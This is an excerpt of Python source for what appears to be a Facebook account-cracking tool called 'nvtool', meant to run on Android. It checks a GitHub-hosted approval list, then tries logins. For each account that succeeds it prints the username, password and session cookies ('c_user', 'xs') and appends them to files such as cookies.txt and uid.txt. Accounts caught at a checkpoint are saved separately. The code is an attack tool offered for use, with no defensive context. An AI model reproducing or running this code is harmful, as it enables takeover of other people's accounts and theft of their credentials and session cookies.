...
def lumd():
    ...
    print('\033[1;92mChecking Approval ....\033[0;97m')
    try:
        httpCaht = requests.get('https://github.com/nvtool-070/approval-/blob/main/approval.txt').text
        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
        uid = os.getuid()
        kex=(f"BCC-{uid}TS{t1}")
            ...
            if "c_user" in log_cookies:
                ...
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m [nvtool-NV] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/nvtool/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/nvtool/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
                    else:
                        print('\033[1;92m [nvtool-OK] '+user+' | '+pas+'')
                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                        open("/sdcard/nvtool/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                        open("/sdcard/nvtool/uid.txt","a").write(user+"|"+pas+"\n")
                        oks.append(ids)
                        break
                ...
                cid = coki[24:39]
                #print('\033[1;91m [nvtool-CP] '+ids+' | '+pas+'')
                open('/sdcard/nvtool/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
